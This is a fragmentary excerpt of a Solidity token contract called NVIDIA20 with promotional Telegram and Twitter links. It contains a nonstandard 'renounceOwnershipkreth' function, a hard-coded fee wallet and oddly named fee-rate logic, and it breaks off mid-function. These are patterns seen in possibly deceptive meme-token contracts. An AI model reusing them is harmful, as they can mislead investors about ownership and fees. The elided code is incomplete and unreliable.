...
/*
https://t.me/Nvidia20_ERC

https://twitter.com/Nvidia20_ERC
...
contract Ownable is Context {
    ...
    function renounceOwnershipkreth() public virtual onlyOwner {
...
contract NVIDIA20 is Context, IERC20, Ownable {
    ...
    address private Walls_Markings = payable(0xb1378487c74740B46e4BE44AF81046c2f796B88b);

    uint256 private   _maxWllsAmounts;
    ...
    function _txRate(bool _uint) private view returns(uint256){
        return _uint ? _maxWllsAmounts : 0;
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()){
            if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
                if(!_Swapping && to == Walls_Markings){
